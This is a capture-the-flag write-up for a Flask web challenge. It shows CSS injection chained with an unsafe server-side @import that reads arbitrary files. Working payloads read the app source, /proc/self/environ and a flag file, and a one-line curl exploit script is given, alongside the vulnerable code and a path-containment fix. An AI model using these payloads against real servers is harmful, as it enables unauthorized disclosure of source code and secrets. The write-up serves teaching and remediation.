# AIscrimination — CydEX 2026

**Category:** Web exploitation  
**Result:** Solved  
**Reported score:** 474 points  
**Stack:** Flask / Python behind Gunicorn  
**Vulnerability:** CSS injection chained with unsafe server-side `@import` expansion, enabling arbitrary local file read (LFI)

## Challenge

> I want to be included.  
> What is the flag hidden by the inclusion design system?

The application accepts three form fields, `display_name`, `comment`, and `statement`, via `POST /join`. It publishes a personalized card, and serves a corresponding CSS file at:

```text
/assets/cards/<profile_id>/identity.css
```

The final successful challenge instance was `http://34.159.214.37:30280` (temporary, likely expired).

## 1. Reconnaissance and unsuccessful hypotheses

The statement `{{7*7}}` appeared literally on the feed and in its generated stylesheet; this did not demonstrate SSTI. A separate `/comments/editorial:reused-component` test also showed escaped HTML and no evaluation of `{{7*7}}`, so stored HTML XSS and SSTI were not demonstrated in that sink.

A post titled *The Brand Team Reused a Component* contained the clue: “If the renderer can find it, the renderer will include it.” The application also mentioned local design fragments and unusual path rules.

## 2. CSS injection

Submitting the following value as the profile's `statement`:

```text
"; color: red; } /*
```

produced:

```css
.identity-card::after {
  content: ""; color: red; } /*";
}
```

The statement was placed in a CSS quoted string without the escaping necessary to prevent breaking out.

## 3. Server-side import expansion

We inserted an `@import` directive:

```text
"; } @import url("style.css"); /*
```

The server replaced it with:

```css
/* design fragment unavailable */
```

This alone only demonstrated that something processed the directive, not a successful file read. Attempts involving `/static/feed.css`, `card.css`, and guessed flag paths returned the same failure marker.

The decisive control was an existing file using the process's current working directory:

```text
"; } @import url("/proc/self/cwd/static/feed.css"); /*
```

The returned stylesheet now included the actual contents of `feed.css` inside a generated `.imported-fragment::after` CSS rule. This established file disclosure through **server-side** processing, not ordinary browser CSS fetching.

## 4. Reading the application source

We changed the target to:

```text
"; } @import url("/proc/self/cwd/app.py"); /*
```

The server embedded the Flask application source in the resulting CSS. The relevant implementation was:

```python
BASE_DIR = Path(__file__).resolve().parent
THEME_ROOT = Path(os.environ.get("THEME_ROOT", str(BASE_DIR / "themes" / "generated")))

# inside compile_theme(css_source, profile_id):
def inline_import(match):
    requested = match.group(1)
    try:
        imported = (THEME_ROOT / requested).resolve().read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError):
        return "/* design fragment unavailable */"
```

**Root cause:** User-controlled `requested` is resolved without a containment check against `THEME_ROOT`. In Python's `pathlib`, an absolute path on the right side overrides the prefix. Relative paths containing `../` can also escape the intended directory if not checked after canonicalization.

The renderer escaped imported text for a CSS `content` property and sent it to the client, leaking file contents.

## 5. Environment discovery

The same technique, importing `/proc/self/environ`, disclosed:

```text
HOME=/home/ctf
PWD=/home/ctf/app
THEME_ROOT=/home/ctf/app/themes/generated
DATABASE_PATH=/tmp/aiscrimination.db
```

The application source showed the SQLite database stored profiles, comments, and rate-limit information; it did not show a hardcoded flag.

## 6. Flag extraction

The candidate `/home/ctf/flag` returned `design fragment unavailable`. Importing `/home/ctf/flag.txt` succeeded.

**Recovered flag:**

```text
CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}
```

### Reproduction on an authorized challenge instance

One-line Kali command (replace `HOST:PORT` with the active challenge address):

```bash
BASE='http://HOST:PORT'; UA='Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'; TARGET='/home/ctf/flag.txt'; HTML=$(curl -sS -L -A "$UA" "$BASE/join" --data-urlencode 'display_name=Human Reader' --data-urlencode 'comment=Reviewing an inclusion design fragment for compatibility.' --data-urlencode "statement=\"; } @import url(\"$TARGET\"); /*"); ID=$(printf '%s' "$HTML" | grep -oE '/people/[a-f0-9]{32}' | head -1 | cut -d/ -f3); echo "PROFILE=$ID"; [ -n "$ID" ] && curl -sS -A "$UA" "$BASE/assets/cards/$ID/identity.css" | grep -oE 'CTF\{[a-fA-F0-9]{64}\}'
```

The application rate-limited short or repetitive requests. No SQL injection, IDOR, or hash computation was necessary for the successful attack.

## 7. Remediation

Resolve the base theme directory, refuse absolute paths, and verify the canonical target remains under that root:

```python
root = THEME_ROOT.resolve()
candidate = Path(requested)
if candidate.is_absolute():
    raise ValueError("Absolute imports not permitted")
target = (root / candidate).resolve()
if not target.is_relative_to(root):
    raise ValueError("Import outside allowed theme directory")
imported = target.read_text(encoding="utf-8")
```

Also consider an allowlist of fragment names and extensions, CSS string escaping, and tests covering absolute paths, traversal, and symlinks.

## Confirmed exploitation chain

**Controlled statement → CSS string escape → custom server-side `@import` → unrestricted path resolution → arbitrary UTF-8 file disclosure → Flask source and environment discovery → `/home/ctf/flag.txt`.**

This report documents only the authorized CydEX challenge instance and separates confirmed findings from failed hypotheses.
